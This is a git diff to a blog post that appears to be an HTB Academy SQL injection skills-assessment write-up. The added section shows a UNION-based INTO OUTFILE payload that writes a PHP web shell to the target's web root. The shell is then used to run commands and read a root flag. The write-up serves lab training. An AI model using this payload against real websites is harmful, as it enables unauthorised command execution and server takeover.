@@ -1,7 +1,7 @@
 ---
 layout: post
 title:  "SQL injection fundamentals skills Assessment - HTB Academy writeup"
-date:   2024-09-06 15:04:00 +0200
+date:   2024-09-06 17:50:00 +0200
 categories: hackthebox academy writeup
 ---
 
@@ -227,4 +227,36 @@ Something's wrong as an **error** occurs. This means we are **not** allowed to w
 
 {:refdef: style="text-align: center;"}
 [![Writing not allowed](/assets/sqlifundamentalsskillsassessment/18_writing_error.png)](/assets/sqlifundamentalsskillsassessment/18_writing_error.png){:target="_blank"}
+{:refdef}
+
+As this page, **dashboard.php**, is located in **/dashboard**, maybe the current user has writing permissions in that directory. Let's try with the following payload, which creates a file that contains vulnerable **PHP** code. This script is going to execute whatever command we're going to pass. Of course we still have to select **5** columns.
+
+{% highlight sql %}
+
+' UNION SELECT "", "<?php system($_REQUEST[0]); ?>", "", "", "" INTO OUTFILE '/var/www/html/dashboard/script.php';-- -
+
+{% endhighlight %}
+
+Indeed, we created our malicious file! The lack of errors is a positive indicator that our file was written successfully.
+
+{:refdef: style="text-align: center;"}
+[![Malicious file created](/assets/sqlifundamentalsskillsassessment/19_successful_write.png)](/assets/sqlifundamentalsskillsassessment/19_successful_write.png){:target="_blank"}
+{:refdef}
+
+All there is to do now is to **exploit** our file by visiting **/dashboard/script.php** and submitting any command in the parameter **0**. For example, visiting **/dashboard/script.php?0=whoami** returns **www-data**, along with other non relevant information.
+
+{:refdef: style="text-align: center;"}
+[![Malicious file created](/assets/sqlifundamentalsskillsassessment/20_shell.png)](/assets/sqlifundamentalsskillsassessment/20_shell.png){:target="_blank"}
+{:refdef}
+
+Executing **ls /root** (remember to **URL-encode** as our command must pass the **webserver**) will reveal the **flag** we were looking for!
+
+{:refdef: style="text-align: center;"}
+[![Found the flag file](/assets/sqlifundamentalsskillsassessment/21_ls_root.png)](/assets/sqlifundamentalsskillsassessment/21_ls_root.png){:target="_blank"}
+{:refdef}
+
+While reading it via **cat** will reval its content.
+
+{:refdef: style="text-align: center;"}
+[![Flag](/assets/sqlifundamentalsskillsassessment/22_flag.png)](/assets/sqlifundamentalsskillsassessment/22_flag.png){:target="_blank"}
 {:refdef}
